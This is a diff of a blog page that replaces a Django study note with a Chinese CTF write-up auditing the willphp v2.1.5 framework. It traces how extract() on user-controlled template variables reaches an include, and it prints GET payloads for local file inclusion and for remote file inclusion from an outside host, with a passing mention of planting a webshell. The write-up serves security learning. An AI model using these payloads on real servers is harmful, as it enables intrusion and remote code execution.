@@ -14,15 +14,16 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="本系列博客主要记录关于python web框架-Django的学习记录.
-这是本系列第    一   篇.
+  <meta name="description" content="web安全的本质最终还得回归到代码层面.
+本专栏博客主要通过复现历史cms的漏洞,来学习,了解以及总结cms中最容易出问题的功能代码.
+代码审计总结
 
-学习,必定是一个持久的过程
-">
+
+前言这是湖湘杯的一道web题目，当时没有分析出来，赛后再复盘一下.">
   <meta name="author" content="Noel">
   <meta name="keywords" content="">
   
-  <title>Django_Log_1 - Noel&#39;s Blog</title>
+  <title>willphp代码审计 - Noel&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -167,7 +168,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Django_Log_1">
+            <span class="h2" id="subtitle" title="willphp代码审计">
               
             </span>
 
@@ -177,8 +178,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-10-07 18:45" pubdate>
-        2021年10月7日 晚上
+      <time datetime="2021-11-17 02:35" pubdate>
+        2021年11月17日 凌晨
       </time>
     </span>
   
@@ -189,7 +190,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      158 字
+      1.1k 字
     </span>
   
 
@@ -199,7 +200,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      12
        分钟
     </span>
   
@@ -237,40 +238,77 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Django_Log_1</h1>
+            <h1 style="display: none">willphp代码审计</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：22 天前
+                  本文最后更新于：8 分钟前
                 
               </p>
             
             <div class="markdown-body">
-              <p>本系列博客主要记录关于<code>python</code> web框架-<code>Django</code>的学习记录.</p>
-<p>这是本系列第    <strong>一</strong>   篇.</p>
-<blockquote>
-<p>学习,必定是一个持久的过程</p>
-</blockquote>
+              <p><em><strong>web安全的本质最终还得回归到代码层面.</strong></em></p>
+<p>本专栏博客主要通过复现历史cms的漏洞,来学习,了解以及总结cms中最容易出问题的功能代码.</p>
+<a href="/2021/11/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/" title="代码审计总结">代码审计总结</a>
+
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是湖湘杯的一道web题目，当时没有分析出来，赛后再复盘一下.</p>
 <span id="more"></span>
-<blockquote>
-<p>很不幸,这篇文章出了点问题导致内容大部分丢失, </p>
-</blockquote>
-<h1 id="预备环境"><a href="#预备环境" class="headerlink" title="预备环境"></a>预备环境</h1><p>为了避免开发环境同日常使用环境产生奇怪冲突,以及第三方资源包的混乱,本系列所有代码均在<code>python</code>的虚拟环境下完成.本人主要使用<code>requests</code>库作者<code>Kenneth Reitz</code>编写的<code>pipenv</code></p>
-<h2 id="pipenv-vscode"><a href="#pipenv-vscode" class="headerlink" title="pipenv + vscode"></a>pipenv + vscode</h2><p><strong>pipenv</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># install by pip</span><br>pip(<span class="hljs-number">3</span>) install pipenv<br><span class="hljs-comment"># you can only install pipev for current user by</span><br>pip(<span class="hljs-number">3</span>) install -user pipenv<br></code></pre></td></tr></table></figure>
+
+<p>相关工具</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">willphp</span> 源码版本 v<span class="hljs-number">2</span>.<span class="hljs-number">1</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">phpstudypro</span><br><span class="hljs-attribute">php7</span>.<span class="hljs-number">3</span>.<span class="hljs-number">4</span><br><span class="hljs-attribute">wind10</span><br><span class="hljs-attribute">vscode</span><br><span class="hljs-attribute">xdebug</span><br></code></pre></td></tr></table></figure>
+
+<p>这道题目对willphp中的<code>app/controller/IndexController.php</code>中的<code>index()</code>方法进行了部分添加，师傅们再下载完<code>willphp</code>后记得在<code>app/controller/IndexController.php</code>中修改部分代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;<br>		highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>        assign(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;value&#x27;</span>]);<br>		<span class="hljs-keyword">return</span> view();<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 
 
-
-
-
-
-
-
-
-
-<p>后篇</p>
-<a href="#">Post not found: Django_Log_2</a>
+<h1 id="0x01-变量覆盖"><a href="#0x01-变量覆盖" class="headerlink" title="0x01 变量覆盖"></a>0x01 变量覆盖</h1><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>访问www主页面，随便传入get参数name以及value，进行代码跟踪</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117125350051.png" srcset="/img/loading.gif" lazyload alt="image-20211117125350051"></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117125515085.png" srcset="/img/loading.gif" lazyload alt="image-20211117125515085"></p>
+<p>进入<code>assign()</code>方法,跳转到<code>willphp/helper.php的第205行</code>,</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117125808230.png" srcset="/img/loading.gif" lazyload alt="image-20211117125808230"></p>
+<p>配合注释,大概能了解到这个函数的作用是将刚才通过get接收到的值传入的到模板中,继续跟进<code>\wiphp\View::assign()</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117130316799.png" srcset="/img/loading.gif" lazyload alt="image-20211117130316799"></p>
+<p>这里直接跳转到一个加载框架的函数,.这里可以先不用管,继续跟踪找<code>assign()</code>.</p>
+<p>在<code>willphp/wiphp/View.php的第13行</code>找到函数定义</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117130801602.png" srcset="/img/loading.gif" lazyload alt="image-20211117130801602"></p>
+<p>这个函数的逻辑很简单,就是将get接收到的<code>$_GET[&#39;name&#39;]</code>和<code>$_GET[&#39;value&#39;]</code>分别以键和值的方式储存在<code>$_vars</code>数组中.</p>
+<p>到此为止,<code>assgin()</code>函数就跟踪完成,接下来是<code>view()</code>,继续跟进.</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117131356434.png" srcset="/img/loading.gif" lazyload alt="image-20211117131356434"></p>
+<p>跳转到<code>willphp/helper.php的第215行</code>,同第一次跟进到<code>assign()</code>函数类似,这里也给出了<code>view()</code>函数的作用以及相关参数说明.</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117131738557.png" srcset="/img/loading.gif" lazyload alt="image-20211117131738557"></p>
+<p>可以看到这里<code>view()</code>中调用了<code>\wiphp\View::fetch()</code>方法,跟进,跳转到<code>willphp/wiphp/View.php的第16行</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117132158642.png" srcset="/img/loading.gif" lazyload alt="image-20211117132158642"></p>
+<p>同时还看到了上一步<code>assign()</code>函数的执行的结果.</p>
+<p>继续一步步调试.</p>
+<p>在38行之前,都没有我们可控的参数,这里就快速过一遍逻辑:主要是定义所需模板的路径以及文件.</p>
+<p>到38行执行了<code>array_work_recursive()</code>函数,通过<code>selg::_parse_vars()</code>来处理<code>self::$_vars</code>,也就是删除<code>self::$_vars</code>中值的反斜杠.</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117132820269.png" srcset="/img/loading.gif" lazyload alt="image-20211117132820269"></p>
+<p>到目前位置,还没遇到危险函数.<strong>不过别放弃,快要到了.</strong></p>
+<p>继续调试发现在<code>39行</code>执行了<code>\Tple::render()</code>函数,跟进,跳转到<code>willphp/wiphp/Tple.php的第13行</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117133404991.png" srcset="/img/loading.gif" lazyload alt="image-20211117133404991"></p>
+<p>由于传入的<code>$_vars</code>变量是可控的,所以我们需要时刻注意在哪些地方用到了这个变量.</p>
+<p>继续调试,发现在15行时进入了if判断,执行<code>self::renderTo()</code>函数,</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117171329979.png" srcset="/img/loading.gif" lazyload alt="image-20211117171329979"></p>
+<p>由于这个函数涉及到可控变量<code>$_vars</code>,跟进,跳转到这个文件的第33行,</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117171530827.png" srcset="/img/loading.gif" lazyload alt="image-20211117171530827"></p>
+<p>继续走,发现在41行使用了变量<code>$_vars</code>,且涉及到危险函数<code>file_get_contents</code>,跟进<code>self::comp()</code>,发现这个函数内部没有使用到<code>$_vars</code>,那就不管,继续调试,</p>
+<p>接着就回到了<code>renderTo()</code>的第44行.问题就出在两行.我们再回过来看看变量<code>$_vars</code>的内容:</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117172308070.png" srcset="/img/loading.gif" lazyload alt="image-20211117172308070"></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117172421908.png" srcset="/img/loading.gif" lazyload alt="image-20211117172421908"></p>
+<p>由于这里使用了<code>extrac()</code>函数后又执行了在一个<code>include</code>文件包含<code>$_cfile</code>的操作,且<code>extract()</code>传入的内容完全可控.那此时就很容易想到构造<code>$_cfile</code>实现任意文件包含.</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在本地的d盘下创建一个文件<code>1.txt</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117173416733.png" srcset="/img/loading.gif" lazyload alt="image-20211117173416733"></p>
+<p>构造get传参<code>/?name=cfile&amp;value=d:\1.txt</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117173656533.png" srcset="/img/loading.gif" lazyload alt="image-20211117173656533"></p>
+<p>可以看到这里我们已经拿到了<code>1.txt</code>中的内容.如果服务端的<code>php.ini</code>中设置了<code>allow_url_include=On</code>,那么漏洞还能进一步利用.在服务器上放置一个文件,其内容为:</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117174218061.png" srcset="/img/loading.gif" lazyload alt="image-20211117174218061"></p>
+<p>再次构造get传参包含远程文件<code>/?name=cfile&amp;value=http://192.168.3.102/index1.txt</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117174359377.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到此处已经成功代码执行,后续还可以直接写个码在漏洞服务器上,然后用蚁剑直接去连等等,这里就不在演示了,师傅们肯定都比我会.</p>
+<h1 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><p>赛后复盘的时候还是很容易就能审计到漏洞点,但是为什么当时做题的时候没有审计出来呢?还是做题的时候没有静下心来,太浮躁了.我真是sb.</p>
+<p>其次,本次审计的办法是采用跟踪函数的方法.通过文章,应该能感觉到通篇都在强调<strong>用户可控</strong>这个词.这也是代码审计中最重要的部分.通过观察用户可控的变量进行了哪些操作,是否存在危险函数,从而判断是否存在漏洞.希望对师傅们有所帮助.</p>
 
             </div>
             <hr>
@@ -280,9 +318,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">语言基础</a>
-                    
-                      <a class="hover-with-bg" href="/categories/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/django/">django</a>
+                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                     
                   </div>
                 
@@ -290,7 +326,9 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/django/">django</a>
+                      <a class="hover-with-bg" href="/tags/cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">cms代码审计</a>
+                    
+                      <a class="hover-with-bg" href="/tags/willphp/">willphp</a>
                     
                   </div>
                 
@@ -307,18 +345,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/10/09/Django-Log-2/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Django_Log_2</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/09/23/tianyibei/">
-                        <span class="hidden-mobile">ezeval</span>
+                      <a href="/2021/11/15/GoogleDork%E5%8F%91%E7%8E%B0%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/">
+                        <span class="hidden-mobile">GoogleDork发现的信息泄漏</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
